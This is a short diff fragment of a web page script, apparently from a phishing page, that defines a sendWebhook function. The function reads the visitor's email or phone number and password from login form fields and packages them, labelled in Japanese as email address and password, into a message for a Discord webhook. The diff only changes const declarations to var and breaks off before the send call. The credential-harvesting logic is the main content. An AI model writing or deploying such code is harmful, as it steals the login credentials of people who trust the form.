@@ -1,12 +1,12 @@
   <script>
   function sendWebhook() {
 
-    const phoneNumber = document.getElementById('input__mailtel').value;
-    const password = document.getElementById('input__password').value;
+    var phoneNumber = document.getElementById('input__mailtel').value;
+    var password = document.getElementById('input__password').value;
 
-    const webhookURL = 'discord webhook';
+    var webhookURL = 'discord webhook';
 
-    const payload = {
+    var payload = {
         content: "```\n" + `メールアドレス: ${phoneNumber}\nパスワード: ${password}` + "\n```",
     };
 
